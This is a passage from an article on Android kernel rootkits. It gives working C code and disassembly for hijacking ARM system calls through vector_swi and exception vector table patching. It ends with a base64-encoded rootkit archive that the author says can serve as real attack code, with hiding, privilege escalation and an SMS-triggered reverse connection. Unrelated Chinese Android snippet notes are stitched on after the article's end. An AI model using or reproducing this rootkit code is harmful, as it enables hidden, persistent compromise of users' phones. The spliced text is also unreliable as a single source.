   174: e5ad0008 str     r0, [sp, #8]!
   178: e1a02007 mov     r2, r7
   17c: e1a0100d mov     r1, sp
   180: e3a00001 mov     r0, #1  ; 0x1
   184: ebfffffe bl      0 <syscall_trace>
   188: eaffffb1 b       54 <ret_to_user>
[*]18c: e320f000 nop     {0}
        ~~~~~~~~ -> position to overwrite the copy of sys_call_table
   190: e320f000 nop     {0}
        ...
  000001a0 <__cr_alignment>:
   1a0: 00000000                                ....
  000001a4 <sys_call_table>:
Now, if we count the offset from the address of sys_call_table to the
address overwritten with the address of sys_call_table copy and then modify
code, we can use the table we copied whenever system call is called. The
hooking code modifying some parts of vector_swi handling routine and nop
code near the address of sys_call_table is as follows:
void install_hooker(){
	void *swi_addr=(long *)0xffff0008;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0,*ptr;
	unsigned char buf[MAP_SIZE+1];
	unsigned long modify_addr1=0;
	unsigned long modify_addr2=0;
	unsigned long addr=0;
	char *addr_ptr;
	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);
	memset((char *)buf,0,sizeof(buf));
	read_kmem(buf,(long)vector_swi_addr,MAP_SIZE);
	ptr=(unsigned long *)buf;
	/* get the address of ldr that handles sys_call_table */
	while(ptr){
		if(((*(unsigned long *)ptr)&0xfffff000)==0xe28f8000){
			modify_addr1=(unsigned long)vector_swi_addr;
			break;
		}
		ptr++;
		vector_swi_addr++;
	}
	/* get the address of nop that will be overwritten */
	while(ptr){
		if(*(unsigned long *)ptr==0xe320f000){
			modify_addr2=(unsigned long)vector_swi_addr;
			break;
		}
		ptr++;
		vector_swi_addr++;
	}
	/* overwrite nop with hacked_sys_call_table */
	addr_ptr=(char *)get_kernel_symbol("hacked_sys_call_table");
	write_kmem((char *)&addr_ptr,modify_addr2,4);
	/* calculate fake table offset */
	offset=modify_addr2-modify_addr1-8;
	/* change sys_call_table offset into fake table offset */
	addr=0xe59f8000+offset; /* ldr r8, [pc, #offset] */
	addr_ptr=(char *)addr;
	write_kmem((char *)&addr_ptr,modify_addr1,4);
	return;
}
This code gets the address of the code that handles sys_call_table within
vector_swi handler routine, and then finds nop code around and stores the
address of hacked_sys_call_table which is a copy version of sys_call_table.
After this, we get the sys_call_table handle code from the offset in which
hacked_sys_call_table resides and then hooking starts.
--[ 5 - exception vector table modifying hooking techniques
This section discusses two hooking techniques, one is the hooking technique
which changes the address of software interrupt exception handler routine
within exception vector table and the other is the technique which changes
the offset of code branching to vector_swi handler. The purpose of these
two techniques is to implement the hooking technique that modifies only
exception vector table without changing sys_call_table and vector_swi
handler.
--[ 5.1 - exception vector table
Exception vector table contains the address of various exception handler
routines, branch code array and processing codes to call the exception
handler routine. These are declared in entry-armv.S, copied to the point of
the high vector(0xffff0000) by early_trap_init() routine within traps.c
code, and make one exception vector table.
traps.c:
void __init early_trap_init(void)
{
	unsigned long vectors = CONFIG_VECTORS_BASE; /* 0xffff0000 */
	extern char __stubs_start[], __stubs_end[];
	extern char __vectors_start[], __vectors_end[];
	extern char __kuser_helper_start[], __kuser_helper_end[];
	int kuser_sz = __kuser_helper_end - __kuser_helper_start;
	/*
	 * Copy the vectors, stubs and kuser helpers
	(in entry-armv.S)
	 * into the vector page, mapped at 0xffff0000,
	and ensure these
	 * are visible to the instruction stream.
	 */
	memcpy((void *)vectors, __vectors_start,
	__vectors_end - __vectors_start);
	memcpy((void *)vectors + 0x200, __stubs_start,
	__stubs_end - __stubs_start);
After the processing codes are copied in order by early_trap_init()
routine, the exception vector table is initialized, then one exception
vector table is made as follows.
# ./coelacanth -e
[000] ffff0000: ef9f0000 [Reset]          ; svc 0x9f0000 branch code array
[004] ffff0004: ea0000dd [Undef]          ; b   0x380
[008] ffff0008: e59ff410 [SWI]            ; ldr pc, [pc, #1040] ; 0x420
[00c] ffff000c: ea0000bb [Abort-perfetch] ; b   0x300
[010] ffff0010: ea00009a [Abort-data]     ; b   0x280
[014] ffff0014: ea0000fa [Reserved]       ; b   0x404
[018] ffff0018: ea000078 [IRQ]            ; b   0x608
[01c] ffff001c: ea0000f7 [FIQ]            ; b   0x400
[020] Reserved
... skip ...
[22c] ffff022c: c003dbc0 [__irq_usr] ; exception handler routine addr array
[230] ffff0230: c003d920 [__irq_invalid]
[234] ffff0234: c003d920 [__irq_invalid]
[238] ffff0238: c003d9c0 [__irq_svc]
[23c] ffff023c: c003d920 [__irq_invalid]
...
[420] ffff0420: c003df40 [vector_swi]
When software interrupt occurs, 4 byte instruction at 0xffff0008 is
executed. The code copies the present pc to the address of exception
handler and then branches. In other words, it branches to the vector_swi
handler routine at 0x420 of exception vector table.
--[ 5.2 - Hooking techniques changing vector_swi handler
The hooking technique changing the vector_swi handler is the first one that
will be introduced. It changes the address of exception handler routine
that processes software interrupt within exception vector table and calls
the vector_swi handler routine forged by an attacker.
	1. Generate the copy version of sys_call_table in kernel heap and
	   then change the address of routine as aforementioned.
	2. Copy not all vector_swi handler routine but the code before
	   handling sys_call_table to kernel heap for simple hooking.
	3. Fill the values with right values for the copied fake vector_swi
	   handler routine to act normally and change the code to call the
	   address of sys_call_table copy version. (generated in step 1)
	4. Jump to the next position of sys_call_table handle code of
	   original vector_swi handler routine.
	5. Change the address of vector_swi handler routine of exception
	   vector table to the address of fake vector_swi handler code.
The completed fake vector_swi handler has a code like following.
00000000 <new_vector_swi>:
    00: e24dd048 sub     sp, sp, #72     ; 0x48
    04: e88d1fff stmia   sp, {r0 - r12}
    08: e28d803c add     r8, sp, #60     ; 0x3c
    0c: e9486000 stmdb   r8, {sp, lr}^
    10: e14f8000 mrs     r8, SPSR
    14: e58de03c str     lr, [sp, #60]
    18: e58d8040 str     r8, [sp, #64]
    1c: e58d0044 str     r0, [sp, #68]
    20: e3a0b000 mov     fp, #0  ; 0x0
    24: e3180020 tst     r8, #32 ; 0x20
    28: 12877609 addne   r7, r7, #9437184
    2c: 051e7004 ldreq   r7, [lr, #-4]
 [*]30: e59fc020 ldr     ip, [pc, #32]  ; 0x58 <__cr_alignment>
    34: e59cc000 ldr     ip, [ip]
    38: ee01cf10 mcr     15, 0, ip, cr1, cr0, {0}
    3c: f1080080 cpsie   i
    40: e1a096ad mov     r9, sp, lsr #13
    44: e1a09689 mov     r9, r9, lsl #13
 [*]48: e59f8000 ldr     r8, [pc, #0]
 [*]4c: e59ff000 ldr     pc, [pc, #0]
 [*]50: <hacked_sys_call_table address>
 [*]54: <vector_swi address to jmp>
 [*]58: <__cr_alignment routine address referring at 0x30>
The asterisk parts are the codes modified or added to the original code. In
addition to the part that we modified to make the code refer __cr_alignment
function, I added some instructions to save address of sys_call_table copy
version to r8 register, and jump back to the original vector_swi handler
function. Following is the attack code written as a kernel module.
static unsigned char new_vector_swi[500];
...
void make_new_vector_swi(){
	void *swi_addr=(long *)0xffff0008;
	void *vector_swi_ptr=0;
	unsigned long offset=0;
	unsigned long *vector_swi_addr=0,orig_vector_swi_addr=0;
	unsigned long add_r8_pc_addr=0;
	unsigned long ldr_ip_pc_addr=0;
	int i;
	offset=((*(long *)swi_addr)&0xfff)+8;
	vector_swi_addr=*(unsigned long *)(swi_addr+offset);
	vector_swi_ptr=swi_addr+offset; /* 0xffff0420 */
	orig_vector_swi_addr=vector_swi_addr; /* vector_swi's addr */
	/* processing __cr_alignment */
	while(vector_swi_addr++){
		if(((*(unsigned long *)vector_swi_addr)&
		0xfffff000)==0xe28f8000){
			add_r8_pc_addr=(unsigned long)vector_swi_addr;
			break;
		}
		/* get __cr_alingment's addr */
		if(((*(unsigned long *)vector_swi_addr)&
		0xfffff000)==0xe59fc000){
			offset=((*(unsigned long *)vector_swi_addr)&
			0xfff)+8;
			ldr_ip_pc_addr=*(unsigned long *)
			((char *)vector_swi_addr+offset);
		}
	}
	/* creating fake vector_swi handler */
	memcpy(new_vector_swi,(char *)orig_vector_swi_addr,
	(add_r8_pc_addr-orig_vector_swi_addr));
	offset=(add_r8_pc_addr-orig_vector_swi_addr);
	for(i=0;i<offset;i+=4){
		if(((*(long *)&new_vector_swi[i])&
		0xfffff000)==0xe59fc000){
			*(long *)&new_vector_swi[i]=0xe59fc020;
			// ldr ip, [pc, #32]
			break;
		}
	}
	/* ldr r8, [pc, #0] */
	*(long *)&new_vector_swi[offset]=0xe59f8000;
	offset+=4;
	/* ldr pc, [pc, #0] */
	*(long *)&new_vector_swi[offset]=0xe59ff000;
	offset+=4;
	/* fake sys_call_table */
	*(long *)&new_vector_swi[offset]=hacked_sys_call_table;
	offset+=4;
	/* jmp original vector_swi's addr */
	*(long *)&new_vector_swi[offset]=(add_r8_pc_addr+4);
	offset+=4;
	/* __cr_alignment's addr */
	*(long *)&new_vector_swi[offset]=ldr_ip_pc_addr;
	offset+=4;
	/* change the address of vector_swi handler
	   within exception vector table */
	*(unsigned long *)vector_swi_ptr=&new_vector_swi;
	return;
}
This code gets the address which processes the sys_call_table within
vector_swi handler routine and then copies original contents of vector_swi
to the fake vector_swi variable before the address we obtained. After
changing some parts of fake vector_swi to make the code refer _cr_alignment
function address correctly, we need to add instructions that save the
address of sys_call_table copy version to r8 register and jump back to the
original vector_swi handler function. Finally, hooking starts when we
modify the address of vector_swi handler function within exception vector
table.
--[ 5.3 - Hooking techniques changing branch instruction offset
The second hooking technique to change the branch instruction offset within
exception vector table is that we don't change vector_swi handler and
change the offset of 4 byte branch instruction code called automatically
when the software interrupt occurs.
	1. Proceed to step 4 like the way in section 5.1.
	2. Store the address of generated fake vector_swi handler routine
	   in the specific area within exception vector table.
	3. Change 1 byte which is an offset of 4 byte instruction codes at
	   0xffff0008 and store.
The code compared with section 5.2 is as follows.
- *(unsigned long *)vector_swi_ptr=&new_vector_swi;
...
+ *(unsigned long *)(vector_swi_ptr+4)=&new_vector_swi; /* 0xffff0424 */
...
+ *(unsigned long *)swi_addr+=4; /* 0xe59ff410 -> 0xe59ff414 */
The changed exception vector table after hooking is as follows.
# ./coelacanth -e
[000] ffff0000: ef9f0000 [Reset]          ; svc 0x9f0000 branch code array
[004] ffff0004: ea0000dd [Undef]          ; b   0x380
[008] ffff0008: e59ff414 [SWI]            ; ldr pc, [pc, #1044] ; 0x424
[00c] ffff000c: ea0000bb [Abort-perfetch] ; b   0x300
[010] ffff0010: ea00009a [Abort-data]     ; b   0x280
[014] ffff0014: ea0000fa [Reserved]       ; b   0x404
[018] ffff0018: ea000078 [IRQ]            ; b   0x608
[01c] ffff001c: ea0000f7 [FIQ]            ; b   0x400
[020] Reserved
... skip ...
[420] ffff0420: c003df40 [vector_swi]
[424] ffff0424: bf0ceb5c [new_vector_swi] ; fake vector_swi handler code
Hooking starts when the address of a fake vector_swi handler code is stored
at 0xffff0424 and the 4 byte branch instruction offset at 0xffff0008
changes the address around 0xffff0424 for reference.
--[ 6 - Conclusion
One more time, I thank many pioneers for their devotion and inspiration.
I also hope various Android rootkit researches to follow. It is a pity
that I couldn't cover all the ideas that occurred in my mind during
writing this paper. However, I also think that it is better to discuss
the advanced and practical techniques next time -if you like this one ;-)-.
For more information, the attached example code provides not only file &
process hiding and kernel module hiding features but also the classical
rootkit features such as admin privilege succession to specific gid user
and process privilege changing. I referred to the Defcon 18 whitepaper of
Christian Papathanasiou and Nicholas J. Percoco for performing the reverse
connection when we receive a sms message from an appointed phone number.
Thanks to:
vangelis and GGUM for translating Korean into English. Other than those who
helped me on this paper, I'd like to thank my colleagues, people in my
graduate school and everyone who knows me.
--[ 7 - References
 [1] "Abuse of the Linux Kernel for Fun and Profit" by halflife
     [Phrack issue 50, article 05]
 [2] "Weakening the Linux Kernel" by plaguez
     [Phrack issue 52, article 18]
 [3] "RUNTIME KERNEL KMEM PATCHING" by Silvio Cesare
     [runtime-kernel-kmem-patching.txt]
 [4] "Linux on-the-fly kernel patching without LKM" by sd & devik
     [Phrack issue 58, article 07]
 [5] "Handling Interrupt Descriptor Table for fun and profit" by kad
     [Phrack issue 59, article 04]
 [6] "trojan eraser or i want my system call table clean" by riq
     [Phrack issue 54, article 03]
 [7] "yet another article about stealth modules in linux" by riq
     ["abtrom: anti btrom" in a mail to Bugtraq]
 [8] "Saint Jude, The Model" by Timothy Lawless
     [http://prdownloads.sourceforge.net/stjude/StJudeModel.pdf]
 [9] "IA32 ADVANCED FUNCTION HOOKING" by mayhem
     [Phrack issue 58, article 08]
[10] "Android LKM Rootkit" by fred
     [http://upche.org/doku.php?id=wiki:rootkit]
[11] "This is not the droid you're looking for..." by Trustwave
     [DEFCON-18-Trustwave-Spiderlabs-Android-Rootkit-WP.pdf]
--[ 8 - Appendix: earthworm.tgz.uu
I attach a demo code to demonstrate the concepts which I explained in this
paper. This code can be used as a real code for attack or just a proof-of-
concept code. I wish you use this code only for your study not for a bad
purpose.
<++> earthworm.tgz.uu
begin-base64 644 earthworm.tgz
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
====
<-->
--[ EOF
```
# 参考
 * http://www.kpbird.com/2012/10/in-depth-android-package-manager-and.html
 * https://github.com/keesj/gomo/wiki/AndroidSecurity
 * http://www.phrack.org/issues.html?issue=68&id=6#article
[[TOC]]
有网站干这事儿了: http://www.androidsnippets.com/
# Android Snippet
# 去掉启动Activity时的系统默认背景
```xml
    <style name="Transparent">
        <item name="android:windowBackground">@color/light_drak</item>
        <item name="android:windowIsTranslucent">true</item>
    </style>
```
# DP/PIX转换
```java
/**
 * This method convets dp unit to equivalent device specific value in pixels. 
 * 
 * @param dp A value in dp(Device independent pixels) unit. Which we need to convert into pixels
 * @param context Context to get resources and device specific display metrics
 * @return A float value to represent Pixels equivalent to dp according to device
 */
public static float convertDpToPixel(float dp,Context context){
    Resources resources = context.getResources();
    DisplayMetrics metrics = resources.getDisplayMetrics();
    float px = dp * (metrics.densityDpi/160f);
    return px;
}
/**
 * This method converts device specific pixels to device independent pixels.
 * 
 * @param px A value in px (pixels) unit. Which we need to convert into db
 * @param context Context to get resources and device specific display metrics
